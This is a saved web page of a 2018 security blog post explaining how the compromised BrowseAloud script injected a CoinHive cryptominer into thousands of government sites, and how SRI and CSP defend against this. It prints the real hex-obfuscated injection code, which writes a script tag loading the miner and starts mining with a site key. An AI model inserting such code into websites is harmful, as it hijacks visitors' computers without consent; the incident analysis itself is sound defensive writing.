@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta http-equiv="origin-trial" content="AkJB8KkVMFYSu3BQxVwdYQA6xFNLbW95xMgGgWiPGS9yn5CJaAa7szMQ7LRVjchadzjsAOLyjtKcLo7Sm52uTgsAAABdeyJvcmlnaW4iOiJodHRwczovL3Njb3R0aGVsbWUuY28udWs6NDQzIiwiZmVhdHVyZSI6IkNvbm5lY3Rpb25BbGxvd2xpc3QiLCJleHBpcnkiOjE3ODg4MjU2MDB9">
+
+    <title>Protect your site from Cryptojacking with CSP + SRI</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#ffffff" />
+
+    <script src="/assets/js/theme.js?v=QOW35pJixIi9sGq2"></script>
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=y6KZrzygjMhUi1XR" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/fontawesome.min.css?v=h20CPZ0QyXlBuAw7" />
+
+    <script></script>
+    <meta name="flattr:id" content="4jvyrv">
+	<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "2d62801e390b4439aec92fe104bb5e02"}'></script><!-- End Cloudflare Web Analytics -->
+    <link rel="icon" href="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/2023/07/profile-pic--3--1.ico" type="image/x-icon">
+    <link rel="canonical" href="https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Scott Helme">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Protect your site from Cryptojacking with CSP + SRI">
+    <meta property="og:description" content="We saw a pretty big event take place over the weekend where a 3rd party provider
+was compromised and their JS library was altered. The alteration introduced a
+crypto mining script that was then subsequently included on over 4,000 websites
+that I know of, many of which were Government">
+    <meta property="og:url" content="https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/">
+    <meta property="og:image" content="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/2018/02/ico-offline.png">
+    <meta property="article:published_time" content="2018-02-11T16:47:53.000Z">
+    <meta property="article:modified_time" content="2018-02-14T08:21:55.000Z">
+    <meta property="article:tag" content="CSP">
+    <meta property="article:tag" content="SRI">
+    <meta property="article:tag" content="Report URI">
+    <meta property="article:tag" content="Cryptojacking">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/scott.helme">
+    <meta property="article:author" content="https://www.facebook.com/scott.helme">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Protect your site from Cryptojacking with CSP + SRI">
+    <meta name="twitter:description" content="We saw a pretty big event take place over the weekend where a 3rd party provider
+was compromised and their JS library was altered. The alteration introduced a
+crypto mining script that was then subsequently included on over 4,000 websites
+that I know of, many of which were Government">
+    <meta name="twitter:url" content="https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/">
+    <meta name="twitter:image" content="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/2018/02/ico-offline.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Scott Helme">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="CSP, SRI, Report URI, Cryptojacking">
+    <meta name="twitter:site" content="@Scott_Helme">
+    <meta name="twitter:creator" content="@Scott_Helme">
+    <meta property="og:image:width" content="992">
+    <meta property="og:image:height" content="649">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Scott Helme",
+        "url": "https://scotthelme.co.uk/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/2023/07/profile-pic--3--1.ico",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Scott Helme",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2023/07/profile-pic.jpg",
+            "width": 1200,
+            "height": 799
+        },
+        "url": "https://scotthelme.co.uk/author/scott/",
+        "sameAs": [
+            "https://scotthelme.co.uk",
+            "https://www.facebook.com/scott.helme",
+            "https://x.com/Scott_Helme"
+        ]
+    },
+    "headline": "Protect your site from Cryptojacking with CSP + SRI",
+    "url": "https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/",
+    "datePublished": "2018-02-11T16:47:53.000Z",
+    "dateModified": "2018-02-14T08:21:55.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/2018/02/ico-offline.png",
+        "width": 992,
+        "height": 649
+    },
+    "keywords": "CSP, SRI, Report URI, Cryptojacking",
+    "description": "We saw a pretty big event take place over the weekend where a 3rd party provider\nwas compromised and their JS library was altered. The alteration introduced a\ncrypto mining script that was then subsequently included on over 4,000 websites\nthat I know of, many of which were Government websites...\n\n\nWhat happened\nI had a friend of mine get in touch about his AV program throwing a warning when\nvisiting the ICO website. The ICO bill themselves as:\n\n\n\u003e The UK’s independent authority set up to uphold ",
+    "mainEntityOfPage": "https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 6.57">
+    <link rel="alternate" type="application/rss+xml" title="Scott Helme" href="https://scotthelme.co.uk/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.69/umd/portal.min.js" data-i18n="true" data-ghost="https://scotthelme.co.uk/" data-key="05928c196e63cd7d49c10cd1e1" data-api="https://scotthelme.co.uk/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style><script async src="https://js.stripe.com/v3/"></script>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="05928c196e63cd7d49c10cd1e1" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://scotthelme.co.uk/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://scotthelme.co.uk/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=D6OJpxckK_6QDJ1o"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=zbOBSN8qHrr3rC6Y">
+    <script defer src="/public/member-attribution.min.js?v=fGWxp7cZ6mmurhvN"></script>
+    <script defer src="/public/ghost-stats.min.js?v=XExDLZJ3NKpv0kSa" data-stringify-payload="false" data-datasource="analytics_events" data-storage="localStorage" data-host="https://scotthelme.co.uk/.ghost/analytics/api/v1/page_hit"  tb_site_uuid="ee889f88-37ef-43e5-9180-f9b88ee6261d" tb_post_uuid="7efdc0c9-5976-4408-8433-a67d22e68fbd" tb_post_type="post" tb_member_uuid="undefined" tb_member_status="undefined" tb_gift_link=""></script><style>:root {--ghost-accent-color: #06b6d4;}</style>
+
+</head>
+<body class="post-template tag-csp tag-sri tag-report-uri tag-cryptojacking">
+
+    <div class="site-wrapper">
+
+        
+
+
+
+<header class="site-home-header">
+    
+
+<style type="text/css">
+    .responsive-header-img {
+        background: rgba(0, 0, 0, 0.3);
+    }
+    .responsive-header-img:after {
+        content: "";
+        position: absolute;
+        background-image: url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w2000/2018/02/ico-offline.png);
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: -1;
+        background-repeat: no-repeat;
+        background-position: 50% 30%;
+        background-size: cover;
+    }
+
+    @media(max-width: 1000px) {
+        .responsive-header-img {
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .responsive-header-img:after {
+            content: "";
+            position: absolute;
+            background-image: url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2018/02/ico-offline.png);
+            background-image: -webkit-image-set(url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2018/02/ico-offline.png) 1x,
+                url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w2000/2018/02/ico-offline.png) 2x);
+            background-image: image-set(url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2018/02/ico-offline.png) 1x,
+                url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w2000/2018/02/ico-offline.png) 2x);
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            background-repeat: no-repeat;
+            background-position: 50% 30%;
+            background-size: cover;
+        }
+    }
+
+    @media(max-width: 600px) {
+        .responsive-header-img {
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .responsive-header-img:after {
+            content: "";
+            position: absolute;
+            background-image: url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w600/2018/02/ico-offline.png);
+            background-image: -webkit-image-set(url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w600/2018/02/ico-offline.png) 1x,
+                url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2018/02/ico-offline.png) 2x);
+            background-image: image-set(url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w600/2018/02/ico-offline.png) 1x,
+                url(https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2018/02/ico-offline.png) 2x);
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            background-repeat: no-repeat;
+            background-position: 50% 30%;
+            background-size: cover;
+        }
+    }
+</style>
+
+	<div class="outer site-post-header-background responsive-header-img">
+
+ 
+        <div class="inner">
+            <nav class="site-nav">
+    <div class="site-nav-left">
+        <div class="site-nav-left-content">
+            <div class="site-nav-content">
+                        <ul class="nav" role="menu">
+		<li class="nav-home" role="menuitem"><a href="https://scotthelme.co.uk">Home</a></li>
+		<li class="nav-speaking" role="menuitem"><a href="https://scotthelme.co.uk/speaking/">Speaking</a></li>
+		<li class="nav-training" role="menuitem"><a href="https://scotthelme.co.uk/training/">Training</a></li>
+		<li class="nav-media" role="menuitem"><a href="https://scotthelme.co.uk/media/">Media</a></li>
+		<li class="nav-contact" role="menuitem"><a href="https://scotthelme.co.uk/contact/">Contact</a></li>
+		<li class="nav-sponsor" role="menuitem"><a href="https://scotthelme.co.uk/sponsor/">Sponsor</a></li>
+		<li role="menuitem"><a href="https://www.facebook.com/scott.helme"><i class="fab fa-facebook"></i></a></li>
+		<li role="menuitem"><a href="https://twitter.com/Scott_Helme"><i class="fab fa-twitter"></i></a></li>
+		<li role="menuitem"><a href="https://github.com/ScottHelme"><i class="fab fa-github"></i></a></li>
+		<li role="menuitem"><a href="https://scotthelme.co.uk/rss/"><i class="fas fa-rss"></i></a></li>
+		<li role="menuitem"><a><i class="fas fa-search" data-ghost-search></i></a></li>
+    </ul>
+
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+        <button id="theme-toggle" class="theme-toggle" type="button" aria-label="Toggle dark mode" aria-pressed="false" title="Toggle dark mode">🌙</button>
+            <a class="button primary small header-cta" href="https://scotthelme.ghost.io/#/portal/signup">Subscribe</a>
+    </div>
+</nav>
+            <div class="site-header-content">
+            </div>
+        </div>
+    </div>
+</header>
+
+<div class="support">
+	<p><strong>Sponsored by: </strong>&nbsp; <a class="support-message" href="https://report-uri.com/?utm_source=scotthelme.co.uk" target="_blank" rel="sponsored noopener"><b>Report URI - Your website is running code you don't control. See it. Control it. Prove it.</b></a></p>
+</div>
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-csp tag-sri tag-report-uri tag-cryptojacking ">
+
+            <header class="post-full-header">
+
+                <section class="post-full-tags">
+                    <a href="/tag/csp/">CSP</a>
+                </section>
+
+                <h1 class="post-full-title">Protect your site from Cryptojacking with CSP + SRI</h1>
+
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w100/2023/07/profile-pic.jpg" alt="Scott Helme" />
+                                    <div class="author-info">
+                                        <div class="bio">
+                                            <h2>Scott Helme</h2>
+                                            <p>Security researcher, entrepreneur and international speaker who specialises in web technologies.</p>
+                                            <p><a href="/author/scott/">More posts</a> by Scott Helme.</p>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <a href="/author/scott/" class="author-avatar">
+                                    <img class="author-profile-image" src="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w100/2023/07/profile-pic.jpg" alt="Scott Helme" />
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="/author/scott/">Scott Helme</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2018-02-11">11 Feb 2018</time>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+
+                <section class="post-full-content">
+                    <div class="post-content">
+                        <!--kg-card-begin: markdown--><p>We saw a pretty big event take place over the weekend where a 3rd party provider was compromised and their JS library was altered. The alteration introduced a crypto mining script that was then subsequently included on over 4,000 websites that I know of, many of which were Government websites...<!--more--></p>
+<br/>
+<h4 id="whathappened">What happened</h4>
+<p>I had a friend of mine get in touch about his AV program throwing a warning when visiting the ICO website. The ICO bill themselves as:</p>
+<br/>
+<blockquote>
+<p>The UK’s independent authority set up to uphold information rights in the public interest, promoting openness by public bodies and data privacy for individuals.</p>
+</blockquote>
+<br/>
+<p>They're the people we complain to when companies do bad things with our data. It was pretty alarming to realise that they were running a crypto miner on their site, their <em>whole</em> site, every single page.</p>
+<br/>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">Ummm, so yeah, this is *bad*. I just had <a href="https://twitter.com/phat_hobbit?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@phat_hobbit</a> point out that <a href="https://twitter.com/ICOnews?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@ICOnews</a> has a cryptominer installed on their site... 😮 <a href="https://t.co/xQhspR7A2f?utm_source=scotthelme.co.uk">pic.twitter.com/xQhspR7A2f</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962684239975272450?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<p>At first the obvious thought is that the ICO were compromised so I immediately started digging into this after firing off a few emails to contact people who may be able to help me with disclosure. I quickly realised though that this script, whilst present on the ICO website, was not being hosted by the ICO, it was included by a 3rd party library they loaded.</p>
+<br/>
+<h4 id="theweaklink">The weak link</h4>
+<p>If you want to load a crypto miner on 1,000+ websites you don't attack 1,000+ websites, you attack the 1 website that they all load content from. In this case it turned out that <a href="https://www.texthelp.com/?utm_source=scotthelme.co.uk">Text Help</a>, an assistive technology provider, had been compromised and one of their hosted script files changed. The offending asset can be found here (<a href="https://www.browsealoud.com/plus/scripts/ba.js?utm_source=scotthelme.co.uk">https://www.browsealoud.com/plus/scripts/ba.js</a>) for the duration it remains but here is the snippet that matters.</p>
+<br/>
+<pre><code>/* [Warning] Do not copy or self host this file, you will not be supported */
+/* BrowseAloud Plus v2.5.0 (13-09-2017) */
+
+
+window[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;][&quot;\x77\x72\x69\x74\x65&quot;](&quot;\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x27\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27 \x73\x72\x63\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x69\x6e\x68\x69\x76\x65\x2e\x63\x6f\x6d\x2f\x6c\x69\x62\x2f\x63\x6f\x69\x6e\x68\x69\x76\x65\x2e\x6d\x69\x6e\x2e\x6a\x73\x3f\x72\x6e\x64\x3d&quot;+window[&quot;\x4d\x61\x74\x68&quot;][&quot;\x72\x61\x6e\x64\x6f\x6d&quot;]()+&quot;\x27\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e&quot;);window[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;][&quot;\x77\x72\x69\x74\x65&quot;]('\x3c\x73\x63\x72\x69\x70\x74\x3e \x69\x66 \x28\x6e\x61\x76\x69\x67\x61\x74\x6f\x72\x2e\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79 \x3e \x31\x29\x7b \x76\x61\x72 \x63\x70\x75\x43\x6f\x6e\x66\x69\x67 \x3d \x7b\x74\x68\x72\x65\x61\x64\x73\x3a \x4d\x61\x74\x68\x2e\x72\x6f\x75\x6e\x64\x28\x6e\x61\x76\x69\x67\x61\x74\x6f\x72\x2e\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79\x2f\x33\x29\x2c\x74\x68\x72\x6f\x74\x74\x6c\x65\x3a\x30\x2e\x36\x7d\x7d \x65\x6c\x73\x65 \x7b \x76\x61\x72 \x63\x70\x75\x43\x6f\x6e\x66\x69\x67 \x3d \x7b\x74\x68\x72\x65\x61\x64\x73\x3a \x38\x2c\x74\x68\x72\x6f\x74\x74\x6c\x65\x3a\x30\x2e\x36\x7d\x7d \x76\x61\x72 \x6d\x69\x6e\x65\x72 \x3d \x6e\x65\x77 \x43\x6f\x69\x6e\x48\x69\x76\x65\x2e\x41\x6e\x6f\x6e\x79\x6d\x6f\x75\x73\x28\'\x31\x47\x64\x51\x47\x70\x59\x31\x70\x69\x76\x72\x47\x6c\x56\x48\x53\x70\x35\x50\x32\x49\x49\x72\x39\x63\x79\x54\x7a\x7a\x58\x71\'\x2c \x63\x70\x75\x43\x6f\x6e\x66\x69\x67\x29\x3b\x6d\x69\x6e\x65\x72\x2e\x73\x74\x61\x72\x74\x28\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');
+
+function toggleBar(){debug.trace(&quot;Legacy toggleBar()&quot;),(!BrowseAloud.config.isMobile||BrowseAloud.config.isMobile&amp;&amp;BrowseAloud.config.availableMobile)&amp;&amp;BrowseAloud.panel.toggleBar(!0)}var _ba_cv=&quot;2.5.0&quot;;if(void 0===_baApplicationServer)var......
+</code></pre>
+<br/>
+<p>The <code>ba.js</code> had been altered to include a <code>document.write</code> call that added a CoinHive crypto miner to any page it was loaded in to. This is a pretty bad situation to be in and any site that loads that file will now have the crypto miner installed. The sheer number of sites affected by this is huge and some of them are really prominent government websites!</p>
+<br/>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">It&#39;s also on <a href="https://twitter.com/uscourts?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@uscourts</a>! <a href="https://t.co/UyPjzbEsPw?utm_source=scotthelme.co.uk">pic.twitter.com/UyPjzbEsPw</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962692890152620033?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">The Student Loan Company here in the UK: <a href="https://t.co/aAq8grshWL?utm_source=scotthelme.co.uk">pic.twitter.com/aAq8grshWL</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962693243510181889?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="es" dir="ltr">The General Medical Council: <a href="https://t.co/Q59OUr8jnr?utm_source=scotthelme.co.uk">pic.twitter.com/Q59OUr8jnr</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962693493201125382?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">The NHS is directly affected too: <a href="https://t.co/PCRBYqYxaa?utm_source=scotthelme.co.uk">pic.twitter.com/PCRBYqYxaa</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962693802279559168?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<p>That's a <em>lot</em> of government websites and at the time of writing there's a quick search here on PublicWWW that lists over 4,000 sites loading the infected file: <a href="https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/?utm_source=scotthelme.co.uk">https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/</a></p>
+<br/>
+<h4 id="preventingtheseattacks">Preventing these attacks</h4>
+<p>This is not a particularly new attack and we've known for a long time that CDNs or other hosted assets are a prime target to compromise a single target and then infect potentially many thousands of websites. The thing is though, there's a pretty easy way to defend yourself against this attack. Let's take the ICO as an example, they load the affected file like this:</p>
+<br/>
+<pre><code>&lt;script src=&quot;//www.browsealoud.com/plus/scripts/ba.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
+</code></pre>
+<br/>
+<p>That's a pretty standard way to load a JS file and the browser will go and fetch that file and include it in the page, along with the crypto miner... Want to know how you can easily stop this attack?</p>
+<br/>
+<pre><code>&lt;script src=&quot;//www.browsealoud.com/plus/scripts/ba.js&quot; integrity=&quot;sha256-Abhisa/nS9WMne/YX+dqiFINl+JiE15MCWvASJvVtIk=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+</code></pre>
+<br/>
+<p>That's it. With that <em>tiny</em> change to how the script is loaded, this attack would have been completely neutralised. What I've done here is add the <a href="https://scotthelme.co.uk/subresource-integrity/?utm_source=scotthelme.co.uk">SRI Integrity Attribute</a> and that allows the browser to determine if the file has been modified, which allows it to reject the file. You can easily generate the appropriate script tags using the <a href="https://report-uri.com/home/sri_hash?utm_source=scotthelme.co.uk">SRI Hash Generator</a> and rest assured the crypto miner could not have found its way into the page. To take this one step further and ensure absolute protection, you can use <a href="https://scotthelme.co.uk/content-security-policy-an-introduction/?utm_source=scotthelme.co.uk">Content Security Policy</a> and the <a href="https://scotthelme.co.uk/csp-cheat-sheet/?utm_source=scotthelme.co.uk#require-sri-for">require-sri-for</a> directive to make sure that no script is allowed to load on the page without an SRI integrity attribute. In short, this could have been totally avoided by all of those involved even though the file was modified by hackers. On top of all of that, you could be alerted to events like this happening on your site via <a href="https://scotthelme.co.uk/csp-and-hpkp-violation-reporting-with-report-uri-io/?utm_source=scotthelme.co.uk">CSP Reporting</a> which is literally the reason I founded <a href="https://report-uri.com/?utm_source=scotthelme.co.uk">Report URI</a>. I guess, all in all, we really shouldn't be seeing events like this happen on this scale to such prominent sites.</p>
+<br/>
+<h4 id="otherinformation">Other information</h4>
+<p>The address of the affected script: <a href="https://www.browsealoud.com/plus/scripts/ba.js?utm_source=scotthelme.co.uk">https://www.browsealoud.com/plus/scripts/ba.js</a></p>
+<p>The whole 3rd party script that was affected: <a href="https://pastebin.com/AHyehgS7?utm_source=scotthelme.co.uk">https://pastebin.com/AHyehgS7</a></p>
+<p>The obfuscated script: <a href="https://pastebin.com/x772SUQU?utm_source=scotthelme.co.uk">https://pastebin.com/x772SUQU</a></p>
+<p>The de-obfuscated script: <a href="https://pastebin.com/57vPLKAH?utm_source=scotthelme.co.uk">https://pastebin.com/57vPLKAH</a></p>
+<p>My blogs on CSP: <a href="https://scotthelme.co.uk/tag/csp/?utm_source=scotthelme.co.uk">https://scotthelme.co.uk/tag/csp/</a></p>
+<p>My blogs on SRI: <a href="https://scotthelme.co.uk/tag/sri/?utm_source=scotthelme.co.uk">https://scotthelme.co.uk/tag/sri/</a></p>
+<p>A list of sites most likely hit: <a href="https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/?utm_source=scotthelme.co.uk">https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/</a></p>
+<br/>
+<p><strong>Update 15:28 11th Feb 2018</strong><br>
+TextHelp seem to have dropped the service in response to the attack:</p>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">It seems that <a href="https://twitter.com/texthelp?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@texthelp</a> have responded and dropped the whole site: <a href="https://t.co/Wymsc7owiw?utm_source=scotthelme.co.uk">pic.twitter.com/Wymsc7owiw</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962709974232248321?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<p><strong>Update 16:32 11th Feb 2018</strong><br>
+The ICO have taken their site offline:</p>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">The <a href="https://twitter.com/ICOnews?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@ICOnews</a> website is now offline: <a href="https://t.co/GejpDSBAgw?utm_source=scotthelme.co.uk">pic.twitter.com/GejpDSBAgw</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962726044338917376?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<p><strong>Update 17:04 11th Feb 2018</strong><br>
+It seems the script file was modified between Sun, 11 Feb 2018 02:58:04 GMT and Sun, 11 Feb 2018 13:21:56 GMT.</p>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">It seems like the <a href="https://twitter.com/texthelp?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@texthelp</a> script file was modified between Sun, 11 Feb 2018 02:58:04 GMT and Sun, 11 Feb 2018 13:21:56 GMT according to the <a href="https://twitter.com/internetarchive?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@internetarchive</a>:<a href="https://t.co/jwKLA6mq7N?utm_source=scotthelme.co.uk">https://t.co/jwKLA6mq7N</a><a href="https://t.co/ZHiUJXBpxC?utm_source=scotthelme.co.uk">https://t.co/ZHiUJXBpxC</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962734149344923648?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<p><strong>Update 08:20 12th Feb 2018</strong><br>
+TextHelp released a statement overnight:</p>
+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">TextHelp have just released a statement: <a href="https://t.co/1HvNFPGxB7?utm_source=scotthelme.co.uk">https://t.co/1HvNFPGxB7</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/962790081923878912?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 11, 2018</a></blockquote>
+<br/>
+<p><strong>Update 17:41 13th Feb 2018</strong><br>
+Antother update from TextHelp with information on the investigation. Service should now be back on Thursday and they will provide details on how to setup SRI for all customers.</p>
